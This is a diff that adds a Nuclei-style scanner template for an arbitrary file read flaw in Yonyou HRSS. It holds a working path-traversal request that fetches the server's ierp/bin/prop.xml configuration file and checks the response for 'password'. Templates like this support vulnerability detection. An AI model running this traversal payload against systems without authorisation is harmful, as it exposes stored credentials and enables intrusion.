@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-hrss-eltextfileloadd-anyfile-read
+info:
+  name: 用友Ufida /hrss/ELTextFile.load.d 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,cn
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<enableHotDeploy>"
+      - type: word
+        words:
+          - "password"
